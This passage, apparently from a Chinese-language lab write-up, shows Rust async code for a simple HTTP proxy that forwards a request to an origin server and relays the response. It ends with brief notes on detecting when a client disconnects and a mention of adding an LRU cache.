    let mut origin = TcpStream::connect(format!("{}:{}", host, port))
        .await
        .ok()?;
    let header = format!(
        "{} {} HTTP/1.0\r\n\
        Host: {}\r\n\
        User-Agent: ......\r\n\
        Connection: close\r\n\
        Proxy-Connection: close\r\n\
        ",
        method, uri, host
    );
    let header = header.as_bytes();
    origin.write_all(header).await.ok()?;

    let mut origin_recv = [0_u8; 1024];
    while let Ok(size) = origin.read(&mut origin_recv).await {
        if size == 0 {
            break;
        }
        client.write_all(&origin_recv[0..size]).await.ok()?;
    }

    // stream exit
    println!("Terminating connection with {}", client.peer_addr().ok()?);
    Some(())
}
```

基本上是一个顺序的流程

对于客户端的退出，这里根据 `send` 系统调用的返回值判断：如果返回值是 0，代表客户端已经退出

```rust
if size == 0 {
    break;
}
```

### Part3

本部分要求给 proxy 增加缓存功能，采用 LRU 替换策略

## 总结与收获

